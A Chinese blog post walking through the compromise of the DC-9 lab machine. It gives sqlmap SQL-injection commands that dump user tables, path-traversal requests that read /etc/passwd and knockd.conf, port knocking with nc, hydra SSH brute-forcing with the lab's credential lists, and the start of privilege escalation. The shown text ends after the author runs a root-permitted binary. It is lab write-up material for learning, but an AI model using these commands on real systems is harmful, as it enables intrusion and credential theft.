@@ -1,0 +1,899 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
+  <link rel="icon" href="/img/candy.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#7732b1">
+  <meta name="author" content="Candy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1. nmap扫描1.1 确认目标ip地址1sudo nmap -sN 192.168.48.0&#x2F;24    确定目标靶机ip：192.168.48.129  1.2 目标开放TCP端口1sudo nmap -sS --min-rate 10000 -p- 192.168.48.129 -oA nmapscan&#x2F;tcpports    开放的tcp端口只有80，那么就意味着我们可能没有什么别的途径">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dc-9打靶日记">
+<meta property="og:url" content="http://candyb0x.github.io/2024/06/28/dc-9%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="1. nmap扫描1.1 确认目标ip地址1sudo nmap -sN 192.168.48.0&#x2F;24    确定目标靶机ip：192.168.48.129  1.2 目标开放TCP端口1sudo nmap -sS --min-rate 10000 -p- 192.168.48.129 -oA nmapscan&#x2F;tcpports    开放的tcp端口只有80，那么就意味着我们可能没有什么别的途径">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230729658.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230732724.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230731866.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230734952.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230737742.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230753952.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230754109.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230810981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230812591.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230812350.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230813647.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230813403.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230831472.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230835523.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230836023.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230838666.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230851926.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281713044.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281731141.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281732607.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281733145.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281736747.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281744949.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281810566.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281811603.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281815754.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282016614.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281843368.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281846891.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281847738.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282011166.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282013314.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282012959.png">
+<meta property="article:published_time" content="2024-06-28T12:16:36.000Z">
+<meta property="article:modified_time" content="2025-08-17T10:06:29.495Z">
+<meta property="article:author" content="Candy">
+<meta property="article:tag" content="web攻防">
+<meta property="article:tag" content="打靶日记">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230729658.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>dc-9打靶日记 - Welcome Candy Box</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Candy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/essay/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>随笔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="dc-9打靶日记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Candy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-28 20:16" pubdate>
+          2024年6月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">dc-9打靶日记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确认目标ip地址"><a href="#1-1-确认目标ip地址" class="headerlink" title="1.1 确认目标ip地址"></a>1.1 确认目标ip地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.48.0/24<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230729658.png" srcset="/img/loading.gif" lazyload alt="image-20240623072943576"></p>
+<blockquote>
+<p>确定目标靶机ip：192.168.48.129</p>
+</blockquote>
+<h2 id="1-2-目标开放TCP端口"><a href="#1-2-目标开放TCP端口" class="headerlink" title="1.2 目标开放TCP端口"></a>1.2 目标开放TCP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sS --min-rate 10000 -p- 192.168.48.129 -oA nmapscan/tcpports<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230732724.png" srcset="/img/loading.gif" lazyload alt="image-20240623073206696"></p>
+<blockquote>
+<p>开放的tcp端口只有80，那么就意味着我们可能没有什么别的途径了，只能通过http去反弹shell了</p>
+</blockquote>
+<h2 id="1-3-目标开放UDP端口"><a href="#1-3-目标开放UDP端口" class="headerlink" title="1.3 目标开放UDP端口"></a>1.3 目标开放UDP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.48.129 -oA nmapscan/udpports<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230731866.png" srcset="/img/loading.gif" lazyload alt="image-20240623073151838"></p>
+<h2 id="1-4-开放TCP端口详细信息"><a href="#1-4-开放TCP端口详细信息" class="headerlink" title="1.4 开放TCP端口详细信息"></a>1.4 开放TCP端口详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT -sV -sC -O -p80 192.168.48.129 -oA nmapscan/tcp-Details<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230734952.png" srcset="/img/loading.gif" lazyload alt="image-20240623073402921"></p>
+<blockquote>
+<p>Apache 2.4.38</p>
+<p>操作系统：Linux3.2-4.9</p>
+</blockquote>
+<h2 id="1-5-nmap漏洞扫描"><a href="#1-5-nmap漏洞扫描" class="headerlink" title="1.5 nmap漏洞扫描"></a>1.5 nmap漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -script=vuln -p80 192.168.48.129 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230737742.png" srcset="/img/loading.gif" lazyload alt="image-20240623073721710"></p>
+<blockquote>
+<p>可能存在CSRF，具体待定，还是到时候访问页面看看吧</p>
+</blockquote>
+<h1 id="2-信息检索"><a href="#2-信息检索" class="headerlink" title="2. 信息检索"></a>2. 信息检索</h1><h2 id="2-1-sql注入点"><a href="#2-1-sql注入点" class="headerlink" title="2.1 sql注入点"></a>2.1 sql注入点</h2><p>通过检索和测试最后找到了sql注入点，一般对于搜索框，存在sql注入的风险比较大，对于这个靶机的网址存在一个搜索，但是非常明显的是这个搜索不是通过get方式传输数据的，所以我们通过抓包可以知道是通过POST方式传输数据的；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230753952.png" srcset="/img/loading.gif" lazyload alt="image-20240623075331916"></p>
+<p>将其发送到重放器（Repeater）中进行测试，发现存在sql注入漏洞</p>
+<blockquote>
+<p>搜索内容为‘Mary’ or 1&#x3D;1#’仍可正常返回所有内容，可确定此处存在sql注入</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230754109.png" srcset="/img/loading.gif" lazyload alt="image-20240623075453064"></p>
+<p>后续使用sqlmap工具对其进行注入即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sqlmap -u &lt;POST提交URL&gt; --data=&quot;&lt;存在sql注入的参数变量&gt;=&lt;啥都行&gt;&quot;</span><br>sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=Mary&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230810981.png" srcset="/img/loading.gif" lazyload alt="image-20240623081058933"></p>
+<p>确实成功被检测到存在sql注入漏洞，接下来就是跟get方式一样的查看数据库内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=1&quot;</span> --dbs<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230812591.png" srcset="/img/loading.gif" lazyload alt="image-20240623081204544"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=1&quot;</span> -D <span class="hljs-built_in">users</span> --tables<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230812350.png" srcset="/img/loading.gif" lazyload alt="image-20240623081244303"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=1&quot;</span> -D <span class="hljs-built_in">users</span> -T UserDetails --columns<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230813647.png" srcset="/img/loading.gif" lazyload alt="image-20240623081320600"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://192.168.48.129/results.php --data=<span class="hljs-string">&quot;search=1&quot;</span> -D <span class="hljs-built_in">users</span> -T UserDetails -C username,password --dump<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230813403.png" srcset="/img/loading.gif" lazyload alt="image-20240623081356342"></p>
+<blockquote>
+<p>| marym     | 3kfs86sfd     |<br>| julied    | 468sfdfsd2    |<br>| fredf     | 4sfd87sfd1    |<br>| barneyr   | RocksOff      |<br>| tomc      | TC&amp;TheBoyz    |<br>| jerrym    | B8m#48sd      |<br>| wilmaf    | Pebbles       |<br>| bettyr    | BamBam01      |<br>| chandlerb | UrAG0D!       |<br>| joeyt     | Passw0rd      |<br>| rachelg   | yN72#dsd      |<br>| rossg     | ILoveRachel   |<br>| monicag   | 3248dsds7s    |<br>| phoebeb   | smellycats    |<br>| scoots    | YR3BVxxxw87   |<br>| janitor   | Ilovepeepee   |<br>| janitor2  | Hawaii-Five-0 |<br>额。。。。。上面没一个账号是能录Manage的，我真是服了</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230831472.png" srcset="/img/loading.gif" lazyload alt="image-20240623083130401"></p>
+<p>顺便查查看刚才那个<code>Staff</code>数据库吧，也是职工数据库，不知道会有什么东西；与上述数据库查看的方式类似，最后在Staff数据库中的<code>Users</code>表中找到了admin用户的账户名和密码，但是密码经过加密</p>
+<blockquote>
+<p>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230835523.png" srcset="/img/loading.gif" lazyload alt="image-20240623083511468"></p>
+<p>通过sqlmap使用普遍密码后缀爆破加密密码，从而爆破出来了admin用户的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230836023.png" srcset="/img/loading.gif" lazyload alt="image-20240623083629943"></p>
+<blockquote>
+<p>username:admin	password:transorbital1</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230838666.png" srcset="/img/loading.gif" lazyload alt="image-20240623083858612"></p>
+<blockquote>
+<p>成功登录后台管理系统；</p>
+</blockquote>
+<h2 id="2-2-目录爆破"><a href="#2-2-目录爆破" class="headerlink" title="2.2 目录爆破"></a>2.2 目录爆破</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch -u http:<span class="hljs-comment">//192.168.48.129/</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406230851926.png" srcset="/img/loading.gif" lazyload alt="image-20240623085129871"></p>
+<blockquote>
+<p>似乎并没有扫出什么有用的目录，另辟蹊径吧</p>
+</blockquote>
+<h2 id="2-3-端口敲门保护SSH"><a href="#2-3-端口敲门保护SSH" class="headerlink" title="2.3 端口敲门保护SSH"></a>2.3 端口敲门保护SSH</h2><p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48539059/article/details/130833674">https://blog.csdn.net/weixin_48539059/article/details/130833674</a></p>
+<p>通过查资料发现，Linux有个端口敲门的保护机制，通过nmap扫描也能找到22端口是过滤状态</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sS -p- 192.168.48.129<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281713044.png" srcset="/img/loading.gif" lazyload alt="image-20240628171343999"></p>
+<p>登录后台管理系统的时候可以发现，似乎存在文件包含漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281731141.png" srcset="/img/loading.gif" lazyload alt="image-20240628173146094"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.129</span><span class="hljs-regexp">/welcome.php?file=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281732607.png" srcset="/img/loading.gif" lazyload alt="image-20240628173209548"></p>
+<p>可以确认确实存在该漏洞，那么我们可以用来查看一下knockd的配置文件信息，以得到敲门端口的顺序</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.129</span><span class="hljs-regexp">/welcome.php?file=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>knockd.conf<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281733145.png" srcset="/img/loading.gif" lazyload alt="image-20240628173315106"></p>
+<blockquote>
+<p>因此我们可以得到通过敲门打开ssh端口22的访问端口顺序为：7469、8475、9842</p>
+</blockquote>
+<p>因此我们通过以下指令打开端口22</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -z 192.168.48.129 7469 8475 9842<br></code></pre></td></tr></table></figure>
+
+<p>现在可以看到22端口已经被打开了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281736747.png" srcset="/img/loading.gif" lazyload alt="image-20240628173615703"></p>
+<p>通过我们之前收集到的信息可以知道，我们在数据库中得到的一大串用户名和密码并未使用，可以尝试通过hydra工具来破解一下ssh试试</p>
+<blockquote>
+<p><code>username.txt</code>:</p>
+<p>marym<br>julied<br>fredf<br>barneyr<br>tomc<br>jerrym<br>wilmaf<br>bettyr<br>chandlerb<br>joeyt<br>rachelg<br>rossg<br>monicag<br>phoebeb<br>scoots<br>janitor<br>janitor2</p>
+<p><code>password.txt</code>:</p>
+<p>3kfs86sfd<br>468sfdfsd2<br>4sfd87sfd1<br>RocksOff<br>TC&amp;TheBoyz<br>B8m#48sd<br>Pebbles<br>BamBam01<br>UrAG0D!<br>Passw0rd<br>yN72#dsd<br>ILoveRachel<br>3248dsds7s<br>smellycats<br>YR3BVxxxw87<br>Ilovepeepee<br>Hawaii-Five-0</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L username.txt -P password.txt -e ns 192.168.48.129 ssh<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281744949.png" srcset="/img/loading.gif" lazyload alt="image-20240628174458899"></p>
+<blockquote>
+<p>成功爆破出三个账户：</p>
+<p>username: chandlerb	password: UrAG0D!</p>
+<p>username: joeyt	password: Passw0rd</p>
+<p>username: janitor	password: Ilovepeepee</p>
+</blockquote>
+<p>通过ssh登录<code>janitor</code>账户查看内容时发现一个秘密文件夹<code>.secrets-for-putin</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281810566.png" srcset="/img/loading.gif" lazyload alt="image-20240628181038525"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281811603.png" srcset="/img/loading.gif" lazyload alt="image-20240628181131563"></p>
+<blockquote>
+<p>发现在其中发现了一个密码文件，我们将这些密码加入密码字典，在对靶机进行一次ssh密码爆破</p>
+<p>BamBam01<br>Passw0rd<br>smellycats<br>P0Lic#10-4<br>B4-Tru3-001<br>4uGU5T-NiGHts</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L username.txt -P password.txt -e ns 192.168.48.129 ssh<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281815754.png" srcset="/img/loading.gif" lazyload alt="image-20240628181520704">除了的三个用户以外，还找到了一个新的用户</p>
+<blockquote>
+<p>username: fredf	password: B4-Tru3-001</p>
+</blockquote>
+<h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><p>登录用户<code>fredf</code>后，通过以下命令查看，找到了一个具有root权限的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406282016614.png" srcset="/img/loading.gif" lazyload alt="image-20240628183820326"></p>
+<blockquote>
+<p>找到了一个具有可执行权限的二进制文件，我们到相关目录进行执行</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt/devstuff/dist/test/<br><span class="hljs-built_in">ls</span><br>./test<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406281843368.png" srcset="/img/loading.gif" lazyload alt="image-20240628184335101"></p>
